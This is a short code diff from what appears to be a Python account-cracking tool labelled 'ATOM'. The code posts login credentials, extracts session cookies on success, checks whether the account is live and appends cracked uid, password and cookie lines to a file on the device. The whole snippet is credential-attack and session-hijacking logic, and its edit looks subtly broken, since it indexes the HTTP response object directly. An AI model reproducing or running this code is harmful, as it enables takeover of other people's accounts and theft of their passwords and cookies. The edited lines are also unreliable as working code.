@@ -1671,15 +1671,15 @@ def mobile(uid,pwx,tl):
             response = ses.post(url, data=encode)
             if "session_key" in response.text:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                 coki = f"sb={sb};{ckkk}"
                 try:
-                    uid = result["uid"]
+                    uid = response["uid"]
                 except:
                     uid = uid
                 c = check_lock(uid)
                 if "live" in c:
-                    if result["is_account_confirmed"] == False:
+                    if response["is_account_confirmed"] == False:
                         print(f" {cyan}[ATOM-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
